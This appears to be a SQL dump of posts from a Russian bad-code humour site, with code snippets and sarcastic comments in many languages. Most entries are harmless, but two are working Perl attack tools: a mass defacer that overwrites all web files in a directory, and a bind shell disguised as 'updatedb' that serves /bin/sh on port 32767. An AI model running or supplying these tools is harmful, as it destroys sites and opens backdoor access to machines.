  (259,1852,1,1230106552,0,'function getWhere($filter)\r\n\t{\r\n\t\t$where = '''';\r\n\t\t\r\n\t\t\tswitch($filter)\r\n\t\t\t{\t\t\t\r\n\t\t\t\tcase ''22'':\r\n\t\t\t\t\t$where = '' where type = 22 '';\r\n\t\t\t\t\treturn $where;\r\n\t\t\t\tbreak;\r\n\t\t\t\tcase ''23'':\r\n\t\t\t\t\t$where = '' where type = 23 '';\r\n\t\t\t\t\treturn $where;\r\n\t\t\t\tbreak;\r\n\t\t\t\tcase ''24'':\r\n\t\t\t\t\t$where = '' where type = 24 '';\r\n\t\t\t\t\treturn $where;\r\n\t\t\t\tbreak;\r\n\t\t\t\tcase ''25'':\r\n\t\t\t\t\t$where = '' where type = 25 '';\r\n\t\t\t\t\treturn $where;\r\n\t\t\t\tbreak;\r\n\t\t\r\n\t\t\t\tdefault:\r\n\t\t\t\t\t$where = '''';\r\n\t\t\t};\r\n\t}','','Ппц, и такое сплошь и рядом (',24,0,1,6),
  (262,1868,1,1230131357,0,'<?\r\n\r\n   $num = substr( $_GET[\"num\"], 0, 1 );\r\n   if ( $num == \"-\" ) {\r\n     // число отрицательное\r\n   } elseif ( $num == 0 ) {\r\n     // число равно нулю\r\n   } else {\r\n     // число положительное\r\n   }\r\n\r\n?>','','Говнокод старых времен. Чисто посмеяться. Оправдание: мозк совсем не варил уже ибо неспали 2-3 дня. Задача: определить ОТРИЦАТЕЛЬНОЕ ЧИСЛО или нет. Решение сами видите. PS: на утро естественно исправили. Сами над \"решением\" ночным ржали долго. :)',32,0,1,2),
  (263,1871,1,1230137047,0,'$_type = ''event'';\r\n        if ( isset($cfgWeight->$_type) ) $this->weight = $cfgWeight->$_type;','','Внимание, вопрос!\r\nНахрена здесь $_type?',4,0,1,3),
  (264,1874,1,1230138006,0,'if (is_null($title) == TRUE) $title = '' / ''. $title;','','',24,0,1,4),
  (265,1876,5,1230138202,0,'#TODO:Сделать функцию факториала\r\ndef factorial(n):\r\n  return str(n)+\"!\"\r\n#TODO:Сделать работающую функцию факториала','','Видимо человек не знает что такое стандартная библиотека',29,0,1,5),
  (269,1887,1,1230143023,1230268998,'function getData ( $id )\r\n{\r\n if( intval( $id ) ) {\r\n  ...\r\n  return $result;\r\n }\r\n \r\n return false;\r\n echo \"Сука блять хуй пиздец!!\";\r\n}','','',-6,0,0,2),
  (270,1889,1,1230143174,0,'try {\r\n\t$id = $faq->addQuestion($_POST);\r\n} catch (FaqException $e) {\r\n\tdie(''Хуй знает что творится... Вбрасывания нет, екзепшн вылез...'');\r\n}','','',18,0,1,1),
  (272,1896,10,1230146498,0,'// Как Было \r\n  if even then \r\n    begin\r\n     if (GameAreaForm.Area.ColCount mod 2 = 0) then isstandart:=true\r\n     else isstandart:=false; \r\n    end\r\n  else\r\n     begin\r\n       if (GameAreaForm.Area.ColCount mod 2 = 0) then isstandart:=false\r\n       else isstandart:=true;\r\n     end;\r\n\r\n// Как стало\r\nif (even) then isstandart:=not(GameAreaForm.Area.ColCount mod 2 = 0);\r\nelse isstandart:=(GameAreaForm.Area.ColCount mod 2 = 0);','','Сравните две части кода.\r\nОднако бывает :-)',15,0,1,7),
  (273,1898,1,1230148358,1230268213,'if (!($conf_content = file_get_contents($data_path.\"voc.conf\"))) {\r\n        die(\"Cannot open voc.conf file, please check your DATA PATH ($data_path) parameter\");\r\n    }\r\n\r\neval($conf_content);','','при условии что voc.conf является пхпфайлом, глупо делать такую мутотень когда можно просто обойдись file_exists и include',-7,0,0,4),
  (274,1913,1,1230199635,0,'<?php\r\n\r\nif(get_magic_quotes_gpc()){\r\n\tforeach($_GET as $k=>$v) $_GET[$k]=strip($v);\r\n\tforeach($_POST as $k=>$v) $_POST[$k]=strip($v);\r\n\tforeach($_REQUEST as $k=>$v) $_REQUEST[$k]=strip($v);\r\n\tforeach($_COOKIE as $k=>$v) $_COOKIE[$k]=strip($v);\r\n}\r\n\r\nif(is_array($_POST)) foreach($_POST as $k=>$v) unset($$k);\r\nif(is_array($_GET)) foreach($_GET as $k=>$v) unset($$k);\r\nif(is_array($_REQUEST)) foreach($_REQUEST as $k=>$v) unset($$k);\r\nif(is_array($_SESSION)) foreach($_SESSION as $k=>$v) unset($$k);\r\nif(is_array($_COOKIE)) foreach($_COOKIE as $k=>$v) unset($$k);','','',3,0,1,2),
  (279,1930,1,1230216706,0,'<?php\r\n  function is_true($value){\r\n    if(var_dump($value) < 11)return true;\r\n    return false;\r\n  }\r\n?>','','',8,0,1,2),
  (280,1932,1,1230216785,1230386074,'<?php\r\n  if(!$boss && ($time > 9) && ($time < 18))do_nothing($me);\r\n?>','','',-9,0,0,2),
  (281,1936,1,1230217518,1230382016,'=----css----\r\ntable{\r\n\tborder:0px; /* border=\"0\" */\r\n\tborder-collapse:collapse; /* cellspacing=\"0\" */\r\n\theight: 100%;\r\n\twidth: 100%;\r\n}\r\ntable td{\r\n\tpadding:0px; /* cellpadding=\"0\" */\r\n}\r\n.inputMsg{\r\n\twidth: 100%;\r\n\tcolor: #040253;\r\n\tborder:1px solid #096;\r\n}\r\n----html-----\r\n<table><tr>\r\n\t<td>time</td>\r\n\t<td><input class=\"inputMsg\" name=\"msg\" type=\"text\" maxlength=\"255\"></td>\r\n\t<td><a href=\"#\" onclick=\"refreshChat(window.document.chatSend.msg.value); window.document.chatSend.msg.value='''';window.document.chatSend.msg.focus(); return false;\" class=\"inputEnter\"></a></td>\r\n</tr></table>','','',-10,0,0,4),
  (282,1941,1,1230221780,1230278140,'<?php\r\necho''Говнокод'';\r\n?>','','Это говнокод',-17,0,0,0),
  (283,1951,9,1230273936,0,'if ((sum != -1 && sum > 0) ) {\r\n    AccountFactory.editAccount(number, sum, bank_num);\r\n}','','Скоро проект сдавать, мозги едут и новый функционал иногда идёт в продакшн в таком вот виде',10,0,1,0),
  (284,1955,1,1230276064,1230387540,'Вообще-то HTML и CSS, но вот на это ругается валидатор:\r\n<b class=\"r10\"></b><b class=\"r7\"></b><b class=\"r5\"></b><b class=\"r4\"></b><b class=\"r3\"></b><b class=\"r2\"></b><b class=\"r2\"></b><b class=\"r1\"></b><b class=\"r1\"></b><b class=\"r1\"></b>','','Дизайн - базарунет, но повтыкайте там хотя б пробелы &nbsp;',-9,0,0,8),
  (285,1959,8,1230277009,1230421537,'в aspx:\r\n<button id=\"btnNewHint\" runat=\"server\" onserverclick=\" NewHint\"><%=GetLanguageString(\"AdminHintCreate\")%></button>\r\n\r\nв cs:\r\n\r\nResponse.Write(\"\\n<script>\\n\" + \"window.open(''AddHint.aspx?CategoryID=\" + CategoryID + \"'','''',''width=850,height=540,menubar=no,location=no,scrollbars=yes,resizable=yes,status=no,toolbar=no'');\" + \"</script>\\n\");','','как бы onclick=\"window.open(...);\" написать нельзя',-6,0,0,1),
  (286,1965,7,1230283789,0,'int p,k,l,i,j,d,q,R,t,r;\r\n  S1:    s=0; p=1;\r\n  S2:    if (s==0) { i=1; j=n; k=n; l=2*n+1; }\r\n         if (s==1) { i=n+1; j=2*n; k=0; l=n+1; }\r\n         d=1; q=p; r=p;\r\n  S3:    if (x[i]>K>x[j]->K) goto S8;\r\n  S4:    k=k+d; x[k]=x[i]; c[k]=c[i];\r\n  S5:    i+=1; q-=1; if (q>0) goto S3;\r\n  S6:    k+=d; if (k==l) goto S13; else x[k]=x[j];c[k]=c[j];\r\n  S7:    j-=1; r-=1; if (r>0) goto S6; else goto S12;\r\n  S8:    k+=d; x[k]=x[j]; c[k]=c[j];\r\n  S9:    j-=1; r-=1; if (r>0) goto S3;\r\n  S10:   k+=d; if (k==l) goto S13; else x[k]=x[i];c[k]=c[i];\r\n  S11:   i+=1; q-=1; if (q>0) goto S10;\r\n  S12:   q=p; r=p; d=-d; t=k; k=l; l=t; if (j-i<p) goto S10; else goto S3;\r\n  S13:   p+=p; if (p<n) { s=1-s; goto S2; }\r\n         if (s==0) for (t=1; t<=n; t+=1) { x[t]=x[t+n];c[t]=c[t+n] }','','Вот такой вариант сортировки предложен в одной известной книге. Оно работает...',48,0,1,8),
  (287,1968,1,1230285735,1231172957,'CREATE OR REPLACE\r\n    TYPE string_list_type IS TABLE OF VARCHAR2(500);\r\n\r\nCREATE OR REPLACE FUNCTION ReadFile(\r\n                     p_file IN VARCHAR2\r\n                     )\r\n      RETURN string_list_type\r\n      AS\r\n        LANGUAGE JAVA\r\n        NAME ''ReadFile.IntoArray(java.lang.String) return java.oracle.Array'';','','',-6,0,0,0),
  (288,1976,1,1230289192,0,'<?php\r\nif (!$ncat) {\r\n    $sql=\"select * from articles_cat where status=1  order by  `name` ASC limit 0,1\";\r\n    $res = m_qr($sql);\r\n    if (m_rows($res)) {\r\n        while ($row = m_arr2($res)) {\r\n            $ncat=$row[id];\r\n            ... 10 строк кода ...\r\n        }\r\n    }\r\n} else {\r\n    $sql=\"select * from articles_cat where id=''$ncat''\";\r\n    $res = m_qr($sql);\r\n    if (m_rows($res)) {\r\n        while ($row = m_arr2($res)) {\r\n            $ncat=$row[id];\r\n            ... те же 10 строк кода ...\r\n        }\r\n    }\r\n}','','Найди десять отличий...',11,0,1,0),
  (289,1983,5,1230297257,0,'def list2str(lst):\r\n\treturn reduce(lambda x,y:x+y,str(list(lst)).split(\"]\")[0].split(\"[\")[1].split(\", \"))','','Функция, переводящая список в строку',11,0,1,1),
  (290,1986,9,1230299315,0,'public void updateTable() {\r\n\r\n        /**\r\n         * Удаляем лишние строки таблицы, оставшиейся от предыдущего списка\r\n         */\r\n        while (viewingData.getResult().getRowDataItems().size() + 1 < dataTable.getRowCount()) {\r\n            dataTable.removeRow(dataTable.getRowCount()-1);\r\n        }\r\n\r\n        /**\r\n         * Отображаем заголовки таблицы\r\n         */\r\n        int titleColumnIndex = 0;\r\n        String[] columnIds = new String[viewingData.getViewingColumns().size()];\r\n        for (String viewingColumnId : viewingData.getViewingColumns().keySet()) {\r\n            columnIds[titleColumnIndex] = viewingColumnId;\r\n            ViewingColumnData viewingColumn = viewingData.getViewingColumns().get(viewingColumnId);\r\n\r\n            HorizontalPanel titlePanel = new HorizontalPanel();\r\n            titlePanel.setVerticalAlignment(HasVerticalAlignment.ALIGN_MIDDLE);\r\n\r\n            Widget columnTitleButton;\r\n            if (viewingColumn.isSortable()) {\r\n                columnTitleButton = new Button(viewingColumn.getTitle());\r\n                ((Button)columnTitleButton).addClickListener(new SortDataClickListener(viewingColumnId));\r\n            } else {\r\n                columnTitleButton = new Label(viewingColumn.getTitle());\r\n            }\r\n\r\n            titlePanel.add(columnTitleButton);\r\n            columnTitleButton.setStyleName(TABLE_STYLE);\r\n\r\n\r\n            if (viewingData.getOrderColumnId() != null && viewingData.getOrderColumnId().equals( viewingColumnId) ) {\r\n                Image orderDirectionImage;\r\n                if (viewingData.getOrderDesc()) {\r\n                    orderDirectionImage = new Image(GWT.getModuleBaseURL() + UP_ARROW_IMG);\r\n                } else {\r\n                    orderDirectionImage = new Image(GWT.getModuleBaseURL() + DOWN_ARROW_IMG);\r\n                }\r\n                titlePanel.add(orderDirectionImage);\r\n            } else {\r\n            }\r\n\r\n            dataTable.setWidget(0, titleColumnIndex, titlePanel);\r\n\r\n            FlexTable.FlexCellFormatter titlePanelFormatter = dataTable.getFlexCellFormatter();\r\n            titlePanelFormatter.setStyleName(0, titleColumnIndex, \"tableTitle\");\r\n            if (viewingColumn.getWidth() > 0) {\r\n                titlePanelFormatter.setWidth(0, titleColumnIndex, viewingColumn.getWidth() + \"%\");\r\n            }\r\n            titlePanelFormatter.setHorizontalAlignment(0, titleColumnIndex, HasHorizontalAlignment.ALIGN_CENTER);\r\n\r\n            titleColumnIndex++;\r\n        }\r\n        /**\r\n         * Удаляем лишние столбцы в заголовке\r\n         */\r\n        int columnToRemove = dataTable.getCellCount(0) - viewingData.getViewingColumns().size();\r\n        dataTable.removeCells(0, viewingData.getViewingColumns().size(), columnToRemove);\r\n\r\n        /**\r\n         * Добавляем чекбокс\r\n         */\r\n        addTitleCheckbox();\r\n\r\n        /**\r\n         * Отображаем значения раскрытых групп\r\n         */\r\n        if (viewingData.getGroupingFilterItems() != null) {\r\n            for (int groupingIndex = 0; groupingIndex < viewingData.getGroupingFilterItems().size(); groupingIndex++ ) {\r\n                String groupingFilterValue = viewingData.getGroupingFilterItems().get(groupingIndex);\r\n                Label valueLabel = new Label(groupingFilterValue);\r\n                Image img = new Image(LEFT_ARROW_IMG);\r\n                HorizontalPanel valuePanel = new HorizontalPanel();\r\n                valuePanel.add(img);\r\n                valuePanel.add(valueLabel);\r\n                valuePanel.setWidth(\"100%\");\r\n                valuePanel.setHorizontalAlignment(HasHorizontalAlignment.ALIGN_LEFT);\r\n\r\n                ClickListener hideGroupClickListener = new HideGroupClickListener(groupingIndex);\r\n                valueLabel.addClickListener(hideGroupClickListener);\r\n                img.addClickListener(hideGroupClickListener);\r\n\r\n                String cellStyle;\r\n                if (groupingIndex % 2 == 0) {\r\n                    cellStyle = \"tableRow\";\r\n                } else {\r\n                    cellStyle = \"tableRowOdd\";\r\n                }\r\n\r\n                for (int column = 0; column < viewingData.getViewingColumns().size(); column++) {\r\n                    String text = null;\r\n\r\n                    /**\r\n                     *\r\n                     */\r\n                    if (groupingIndex == viewingData.getGroupingFilterItems().size()-1 && viewingData.getFunctionData().containsKey(columnIds[column])) {\r\n                        text = \"(\" + viewingData.getFunctionData().get(columnIds[column]) + \")\";\r\n                    } else {','','краткость сестра таланта',10,0,1,2),
  (291,1990,1,1230300192,0,'function ShowUserRowStatus($key, $value){\r\n  //Check value\r\n  settype($value, ''integer'');\r\n  switch($value){\r\n    case ''1'':{\r\n      $content=''~s_enable~'';\r\n      break;\r\n      }\r\n    default:{\r\n      $content=''~s_disable~'';\r\n      }\r\n  }\r\n  //exit\r\n  return $content;\r\n}','','Сложное и неправильное решение простых задач...',23,0,1,2),
  (292,1992,8,1230303622,0,'prNewProduct.Description = Convert.ToString(tbDescription.Text);','','А мы её ещё стрингее сделаем!',20,0,1,1),
  (294,1996,8,1230306748,1230433677,'private string RemoveNonAlphaChars(string txt)\r\n{\r\nstring returnText = txt;\r\n\r\nreturnText = returnText.Replace(\"~\", \"\");\r\nreturnText = returnText.Replace(\"`\", \"\");\r\nreturnText = returnText.Replace(\"!\", \"\");\r\nreturnText = returnText.Replace(\"@\", \"\");\r\nreturnText = returnText.Replace(\"#\", \"\");\r\nreturnText = returnText.Replace(\"$\", \"\");\r\nreturnText = returnText.Replace(\"%\", \"\");\r\nreturnText = returnText.Replace(\"^\", \"\");\r\nreturnText = returnText.Replace(\"&\", \"\");\r\nreturnText = returnText.Replace(\"*\", \"\");\r\nreturnText = returnText.Replace(\"(\", \"\");\r\nreturnText = returnText.Replace(\")\", \"\");\r\nreturnText = returnText.Replace(\"-\", \"\");\r\nreturnText = returnText.Replace(\"_\", \"\");\r\nreturnText = returnText.Replace(\"+\", \"\");\r\nreturnText = returnText.Replace(\"=\", \"\");\r\nreturnText = returnText.Replace(\"{\", \"\");\r\nreturnText = returnText.Replace(\"}\", \"\");\r\nreturnText = returnText.Replace(\"[\", \"\");\r\nreturnText = returnText.Replace(\"]\", \"\");\r\nreturnText = returnText.Replace(\"|\", \"\");\r\nreturnText = returnText.Replace(\"\\\\\", \"\");\r\nreturnText = returnText.Replace(\"\\\"\", \"\");\r\nreturnText = returnText.Replace(\"''\", \"\");\r\nreturnText = returnText.Replace(\";\", \"\");\r\nreturnText = returnText.Replace(\"<\", \"\");\r\nreturnText = returnText.Replace(\",\", \"\");\r\nreturnText = returnText.Replace(\">\", \"\");\r\nreturnText = returnText.Replace(\".\", \"\");\r\nreturnText = returnText.Replace(\"/\", \"\");\r\nreturnText = returnText.Replace(\"?\", \"\");\r\nreturnText = returnText.Replace(\" \", \"\");\r\n\r\nreturn returnText.ToUpper();\r\n}','','Убирает разделители. ;)',-6,0,0,1),
  (295,2002,7,1230319636,1230421755,'for(int i=0;i<m_tabWidget->count();i++){\r\n\t\ttextEdit = (TextEdit*)m_tabWidget->widget(i);\r\n\t\tif( textEdit && textEdit->close()){\r\n\t\t\tdelete textEdit;\r\n\t\t\ttextEdit = 0;\r\n\t\t}\r\n                else break;\r\n\t}','','Часто забывают, что количество элементов в списке изменяется при удалении из него.',-10,0,0,3),
  (296,2017,8,1230412761,0,'int CompareTo (A a1, A a2)\r\n{\r\n   if (a1.Year>a2.Year) return 1;\r\n   if (a1.Year<a2.Year) return -1;\r\n    return 0;\r\n}','','реализация интерфейса IComparable, чем не понравилось стандартное норминрование: return a1.Year - a2.Year; так и не понял\r\n\r\n',11,0,1,5),
  (297,2024,1,1230458235,0,'$dayofmonth = date(''t'');\r\n$day_count = 1;\r\n\r\n$num = 0;\r\nfor($i = 0; $i < 7; $i++)\r\n{\r\n\t$dayofweek = date(''w'', mktime(0, 0, 0, date(''m''), $day_count, date(''Y'')));\r\n\t$dayofweek = $dayofweek - 1;\r\n\tif($dayofweek == -1) $dayofweek = 6;\r\n\tif($dayofweek == $i)\r\n\t{\r\n\t\t$week[$num][$i] = $day_count;\r\n\t\t$day_count++;\r\n\t}\r\n\telse $week[$num][$i] = \"\";\r\n}\r\n\r\nwhile(true)\r\n{\r\n\t$num++;\r\n\tfor($i = 0; $i < 7; $i++)\r\n\t{\r\n\t\t$week[$num][$i] = $day_count;\r\n\t\t$day_count++;\r\n\t\tif($day_count > $dayofmonth) break;\r\n\t}\r\n    if($day_count > $dayofmonth) break;\r\n}','','взято с softtime.ru, PHP5 самоучитель',10,0,1,1),
  (298,2033,8,1230483406,0,'if (current_switch == true)\r\n{\r\n//вырезано\r\n}\r\nelse if (current_switch == false)\r\n{\r\n//вырезано\r\n}','','Данный говнокод взят из журнала \"ХАКЕР\". Вот ссылка, http://www.xakep.ru/magazine/xs/071/076/1.asp\r\n\r\nхакеры пля...=\\',44,0,1,2),
  (299,2035,8,1230483735,0,'public static void brute(long diap)\r\n{\r\nn = 68491; //задаем некое число\r\nNewMessage(\"w8. Bruteforce working...\"); //вызываем событие\r\nfor (int i = 0; i < diap; i++) //мутим цикл\r\n{\r\nd = i;\r\nstring brute = Convert.ToString(bug.Equals(n, d)); //сравниваем и возвращаем результат в строку\r\nif (brute == \"True\")\r\n{\r\nBruteComplete(d.ToString()); //вызываем событие при удачном переборе\r\nbreak;\r\n}\r\n}\r\nif (ok == false)\r\n{\r\nNewMessage(\"Brete Failed:(\");\r\n}\r\n}','','Еще один:\r\nДанный говнокод взят из журнала \"ХАКЕР\". Вот ссылка, http://www.xakep.ru/magazine/xs/071/076/1.asp\r\nТут программа должна подобрать число n. Как я понял тип n тут или не указан или переменная глобальная. Но нахрена тогда её объявлять глобальной если она применяется только в этом методе. Далее, d = i это вообще пиздец, да конечно же, если n это объект, а не int то все правильно. Но мне кажется автор полный мудак после того что создал строку brute, блять, конвертировал bool d string и сравнивает строку вида True с true. пиздец, пиздец....уебки...руки поотрывать...\r\nхакеры пля...=\\',105,0,1,12),
  (300,2037,1,1230484192,1230548267,'<?php\r\ndefine(''true'',false);\r\n?>','','-',-16,0,0,1),
  (301,2039,1,1230484226,1230545532,'\\n\r\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n\r\n\\n','','12145',-16,0,0,0),
  (302,2046,1,1230496042,1230558898,'<?php\r\n// © Eugen :)\r\n// ...\r\nfunction fuck($v) {\r\n    global $pizdec;\r\n    // ...\r\n}\r\n// ...\r\n?>','','Оптимистически...',-16,0,0,0),
  (303,2049,9,1230536213,0,'private List<WorkOrderWrapper> copy(List<WorkOrderWrapper> src) {\r\n\t\tList<WorkOrderWrapper> ret = Collections.emptyList();\r\n\r\n\t\tif (src != null) {\r\n\t\t\tret = new ArrayList<WorkOrderWrapper>(src.size());\r\n\r\n\t\t\tfor (int i = src.size() - 1; i >= 0; i--) {\r\n\t\t\t\tret.add(src.get(i));\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\treturn ret;\r\n\t}','','Мы легких путей не ищем!',8,0,1,0),
  (304,2053,1,1230556548,0,'$this->mm = ($this->md[2] < 4) ? ($this->md[2] < 3) ? ($this->md[2] < 2) ? imagecreatefromgif($this->mi) : imagecreatefromjpeg($this->mi) : imagecreatefrompng($this->mi) : Null;','','Загрузка изображения в VaMShop',10,0,1,0),
  (305,2055,1,1230557770,0,'set_include_path(  dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.DIRECTORY_SEPARATOR.''libs''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.DIRECTORY_SEPARATOR.\r\n    ''libs''.DIRECTORY_SEPARATOR.''doctrine''.DIRECTORY_SEPARATOR.''lib''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.\r\n    DIRECTORY_SEPARATOR.''libs''.DIRECTORY_SEPARATOR.''doctrine''.DIRECTORY_SEPARATOR\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.\r\n    DIRECTORY_SEPARATOR.''libs''.DIRECTORY_SEPARATOR.''doctrine''.DIRECTORY_SEPARATOR.\r\n    ''tests''.DIRECTORY_SEPARATOR.''DoctrineTest''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.\r\n    DIRECTORY_SEPARATOR.''libs''.DIRECTORY_SEPARATOR.''doctrine''.DIRECTORY_SEPARATOR.\r\n    ''tests''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''Model''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''Model''.DIRECTORY_SEPARATOR.''BaseClasses''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.DIRECTORY_SEPARATOR.''libs''.DIRECTORY_SEPARATOR.''smarty''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.DIRECTORY_SEPARATOR\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.DIRECTORY_SEPARATOR.''libs''.DIRECTORY_SEPARATOR.''jsPacker''\r\n    . PATH_SEPARATOR . dirname(__FILE__) . DIRECTORY_SEPARATOR.''..''.DIRECTORY_SEPARATOR.''libs''.DIRECTORY_SEPARATOR.''FirePHPLibrary''.DIRECTORY_SEPARATOR.''lib''\r\n    . PATH_SEPARATOR . get_include_path());','','',29,0,1,1),
  (306,2060,12,1230558876,1230707807,'push esp\r\npush $00000101\r\nmov eax,[$0044ee50]\r\nmov eax,[eax] ;eax = 0\r\ncall eax','','Вызывал функцию WSAStartup в дельфе, но забыл из какого она юнита. Хелп показал 2 пункта WSAStartup, не подумал тупо скопировал IdWinsock (вместо Winsock). Запускаю - access violation. В дебагере ctrl+c. Дельфя скомпилила так, что в любом случае вылетает аксес :)',-4,0,0,10),
  (307,2085,4,1230586464,0,'#!/usr/bin/perl -w \r\n#Masss Defacer v2.0 \r\n# Coded By illuz1oN \r\n# Creditz - Nostur \r\n$def = ''YOUR LAME DEFACE PAGE HERE =)''; \r\n{        print \"[+]DEFACING...\\n\"; \r\n         print\"[+]DEFACING .PHP FILES...\\n\"; \r\n\t\t my @php = glob(\"*.php\"); #Files \r\n     foreach my $deface(@php){ \r\n     open(DEFACE, ''>'', $deface); \r\n     print DEFACE $def || print \"[-]Fxcked up: $!\\n\"; \r\n     close(DEFACE) \r\n  } \r\n         print \"[+]DEFACING .HTML FILES...\\n\"; \r\n         my @html = glob(\"*.html\"); #Files \r\n     foreach my $deface(@html){ \r\n     open(DEFACE, ''>'', $deface); \r\n     print DEFACE $def || print \"[-]Fxcked up: $!\\n\"; \r\n     close(DEFACE) \r\n  } \r\n         print \"[+]DEFACING .ASP FILES...\\n\"; \r\n\t\t my @asp = glob(\"*.asp\"); #Files \r\n     foreach my $deface(@asp){ \r\n     open(DEFACE, ''>'', $deface); \r\n     print DEFACE $def || print \"[-]Fxcked up: $!\\n\"; \r\n     close(DEFACE) \r\n  } \r\n         print \"[+]DEFACING .ASPX FILES...\\n\"; \r\n\t\t my @aspx = glob(\"*.aspx\"); #Files \r\n     foreach my $deface(@aspx){ \r\n     open(DEFACE, ''>'', $deface); \r\n     print DEFACE $def || print \"[-]Fxcked up: $!\\n\"; \r\n     close(DEFACE) \r\n  } \r\n         print \"[+]DEFACING .HTM FILES...\\n\"; \r\n\t\tmy @htm = glob(\"*.htm\"); #Files \r\n     foreach my $deface(@htm){ \r\n     open(DEFACE, ''>'', $deface); \r\n     print DEFACE $def || print \"[-]Fxcked up: $!\\n\"; \r\n     close(DEFACE) \r\n  } \r\n         print \"[+]DEFACING .JS FILES...\\n\"; \r\n\tmy @js = glob(\"*.js\"); #Files \r\n     foreach my $deface(@js){ \r\n     open(DEFACE, ''>'', $deface); \r\n     print DEFACE $def || print \"[-]Fxcked up: $!\\n\"; \r\n     close(DEFACE) \r\n  } \r\n         print \"[+]DEFACING .AC FILES...\\n\"; \r\n\t\t my @ac = glob(\"*.ac\"); #Files \r\n     foreach my $deface(@ac){ \r\n     open(DEFACE, ''>'', $deface); \r\n     print DEFACE $def || print \"[-]Fxcked up: $!\\n\"; \r\n     close(DEFACE) \r\n  } \r\n  print \"[+]Pages Should Be Defaced!\\n\"; \r\n \r\n} \r\n#Coded By illuz1oN \r\n#Credits - Nostur!','','',4,0,1,0),
  (308,2088,4,1230592242,0,'#!/usr/bin/perl\r\n\r\n$port = 32767;\r\n$port = $ARGV[0] if $ARGV[0];\r\nexit if fork;\r\n$0 = \"updatedb\" . \" \" x100;\r\n$SIG{CHLD} = ''IGNORE'';\r\nuse Socket;\r\nsocket(S, PF_INET, SOCK_STREAM, 0);\r\nsetsockopt(S, SOL_SOCKET, SO_REUSEADDR, 1);\r\nbind(S, sockaddr_in($port, INADDR_ANY));\r\nlisten(S, 50);\r\nwhile(1)\r\n{\r\n    accept(X, S);\r\n    unless(fork)\r\n    {\r\n        open STDIN, \"<&X\";\r\n        open STDOUT, \">&X\";\r\n        open STDERR, \">&X\";\r\n        close X;\r\n        exec(\"/bin/sh\");\r\n    }\r\n    close X;\r\n}','','',3,0,1,1),
  (309,2090,1,1230592798,0,'<?\r\necho \"<title>NNtime Proxy List</title>\";\r\nfunction proxylist($site){\r\n$source=file_get_contents($site);\r\npreg_match_all(\"/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}:[0-9]{2,4}/\",$source,$matched);\r\nreturn $matched[0];\r\n}\r\n\r\n$array=proxylist(\"http://www.nntime.com\");\r\nforeach($array as $tek){\r\n$tek=str_replace(\"\r\n\",\"\",$tek);\r\nprint $tek.\"<br>\";\r\n}\r\n?>','','',7,0,1,0),
  (310,2117,8,1230615995,0,'switch (driver.Status)\r\n      {\r\n        case ClientStatus.Unknown:\r\n          return m_driverStatusNames[ClientStatus.Unknown];\r\n        case ClientStatus.Free:\r\n          return m_driverStatusNames[ClientStatus.Free];\r\n        case ClientStatus.Busy:\r\n          return m_driverStatusNames[ClientStatus.Busy];\r\n        case ClientStatus.InWay:\r\n          return m_driverStatusNames[ClientStatus.InWay];\r\n        case ClientStatus.Work:\r\n          return m_driverStatusNames[ClientStatus.Work];\r\n        case ClientStatus.Break:\r\n          return m_driverStatusNames[ClientStatus.Break];\r\n        case ClientStatus.Alarm:\r\n          return m_driverStatusNames[ClientStatus.Alarm];\r\n      }','',':)',16,0,1,2),
  (311,2119,8,1230622199,0,'while (true) {\r\n    try {\r\n        break;\r\n    }\r\n    catch {\r\n\r\n    }\r\n}','','интересно сработает?',13,0,1,0),
  (312,2121,6,1230624966,0,'if( strncmp(\"ERROR: Unable to service request\",msg.data, strlen(\"Unable to service request\")) == 0 )\r\n    return 1;\r\n if( strncmp(\"ERROR: (201) Unable to service request\",msg.data, strlen(\"(201) Unable to service request\")) == 0 )\r\n    return 1;\r\n if( strncmp(\"ОШИБКА: (201) Невозможно обработать запрос.\",msg.data, strlen(\"(201) Невозможно обработать запрос.\")) == 0 )\r\n    return 1;\r\n if( strncmp(\"ERROR: (201) Невозможно обработать запрос\",msg.data, strlen(\"(201) Невозможно обработать запрос.\")) == 0 )\r\n   return 1;','','',17,0,1,1),
